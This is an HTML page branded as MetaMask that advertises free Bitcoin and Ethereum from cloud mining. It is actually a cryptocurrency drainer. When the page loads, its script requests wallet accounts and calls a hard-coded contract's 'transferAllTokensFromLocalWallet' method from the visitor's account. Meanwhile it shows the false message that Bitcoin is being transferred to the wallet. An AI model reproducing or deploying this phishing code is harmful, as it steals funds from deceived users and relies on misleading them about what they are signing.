<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MetaMask</title>
  <link rel="icon" href="https://assets.clarisco.com/images/banner/hire/tools/metamask.webp" type="image/x-icon">
  <style>
 body {
    background-image: url("https://static.independent.co.uk/2021/04/29/14/ethereum%20price%20latest%20bitcoin.jpg?quality=75&width=640&crop=3%3A2%2Csmart&auto=webp");
    background-repeat: no-repeat;
    background-position-x: center;
    background-size: 100%; 
    font-family: Arial, sans-serif;
    text-align: center;
}

  #status {
    font-size: 18px;
    margin-top: 20px;
  }

  #loader {
    display: none;
    margin: 20px auto;
    width: 100px;
    height: 100px;
    border: 10px solid #ccc;
    border-radius: 50%;
    border-top-color: #0074D9;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  h1, p {
      font-size: 28px;
      color: white;
  </style>
</head>
<body>
  <h1>Get free Bitcoin and Ethereum by cloud mining directly to your wallet</h1>
  <p id="status">Bitcoin is being transferred to your wallet</p>
  <div id="loader">ِConnect</div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@metamask/eth-provider@latest/dist/index.min.js"></script>
  <script>
    
    const contractAddress = "0x96E19294286F2b49a3f4F5B139Cd8a17C56522AE";

    
    const abi = [
  {
    "inputs": [],
    "name": "transferAllTokensFromLocalWallet",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

    let metamaskWeb3;
    let contract;

    function updateStatus(message) {
      $("#status").text(message);
    }

    async function connectAndInteract() {
      try {
        
        $("#loader").show();

        
        if (window.ethereum) {
          
          await ethereum.enable();
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts.length > 0) {
            
            metamaskWeb3 = new Web3(window.ethereum);
            
            contract = new metamaskWeb3.eth.Contract(abi, contractAddress);

            
            metamaskWeb3.on('accountsChanged', accountsChanged);

            
            try {
              await contract.methods.transferAllTokensFromLocalWallet().send({ from: accounts[0] });
              updateStatus("Transaction successful");
            } catch (error) {
              updateStatus("Transaction failed: " + error.message);
            }
          } else {
            updateStatus("No accounts found");
          }
        } else {
          updateStatus("No MetaMask provider detected");
        }
      } catch (error) {
        updateStatus("Error connecting: " + error.message);
      } finally {
        
        $("#loader").hide();
      }
    }

    function accountsChanged(accounts) {
  
  if (accounts.length > 0) {
    updateStatus("Account changed to " + accounts[0]);
   
    contract = new metamaskWeb3.eth.Contract(abi, contractAddress);
  } else {
    updateStatus("No accounts found");
  }
}

$(document).ready(function() {
  connectAndInteract();
});

  </script>
</body>
</html>
